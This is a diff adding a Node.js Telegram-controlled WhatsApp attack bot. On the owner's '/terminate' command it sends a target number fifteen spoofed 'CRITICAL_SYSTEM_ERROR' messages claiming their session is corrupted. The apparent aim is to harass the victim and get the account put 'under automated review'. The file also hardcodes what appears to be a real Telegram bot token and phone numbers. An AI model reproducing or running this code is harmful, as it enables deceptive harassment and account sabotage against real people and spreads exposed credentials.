@@ -1,0 +1,74 @@
+const { Telegraf } = require('telegraf');
+const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
+const pino = require('pino');
+const crypto = require('crypto');
+
+// [CONFIGURATION]
+const BOT_TOKEN = "8900354413:AAGkXHvtVvLQxJczN2GDd_9zqYNlhT8YycY";
+const OWNER_ID = "8605709847"; 
+const GHOST_NUMBER = "255724299532"; 
+
+// [GLOBAL ERROR HANDLING]
+process.on('uncaughtException', (err) => console.error('👑 [SYSTEM CRITICAL]:', err));
+process.on('unhandledRejection', (reason) => console.error('👑 [PROMISE REJECTION]:', reason));
+
+const bot = new Telegraf(BOT_TOKEN);
+let sock;
+
+async function startWhatsApp() {
+    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    
+    sock = makeWASocket({ 
+        auth: state, 
+        logger: pino({ level: 'silent' }),
+        browser: ["Safari", "Mac OS", "16.0.0"] 
+    });
+
+    if (!sock.authState.creds.registered) {
+        setTimeout(async () => {
+            const code = await sock.requestPairingCode(GHOST_NUMBER);
+            console.log(`\n👑 [KING KERNEL]: PAIRING CODE: ${code}\n`);
+        }, 5000);
+    }
+
+    sock.ev.on('creds.update', saveCreds);
+    sock.ev.on('connection.update', (u) => {
+        if (u.connection === 'close') startWhatsApp();
+    });
+}
+
+const getElitePayload = () => ({
+    text: "⚠️ SECURITY_ALERT: SYSTEM_FAILURE_0x" + crypto.randomBytes(4).toString('hex'),
+    contextInfo: {
+        externalAdReply: {
+            title: "CRITICAL_SYSTEM_ERROR",
+            body: "Your WhatsApp session is corrupted.",
+            mediaType: 1,
+            thumbnail: Buffer.alloc(0) 
+        }
+    }
+});
+
+bot.on('text', async (ctx) => {
+    if (ctx.from.id.toString() !== OWNER_ID) return;
+    
+    const input = ctx.message.text.split(' ');
+    if (input[0] === '/terminate') {
+        const target = input[1].replace(/\D/g, '') + '@s.whatsapp.net';
+        ctx.reply(`💀 [TERMINATOR]: Initiating destruction for ${input[1]}...`);
+
+        try {
+            for (let i = 0; i < 15; i++) {
+                await new Promise(r => setTimeout(r, 4000));
+                await sock.sendMessage(target, getElitePayload());
+                console.log(`💀 [TERMINATOR]: Packet ${i+1} sent to ${target}`);
+            }
+            ctx.reply('✅ [TERMINATOR]: Sequence finished. Target account under automated review.');
+        } catch (e) {
+            ctx.reply(`❌ [ERROR]: ${e.message}`);
+        }
+    }
+});
+
+startWhatsApp();
+bot.launch();
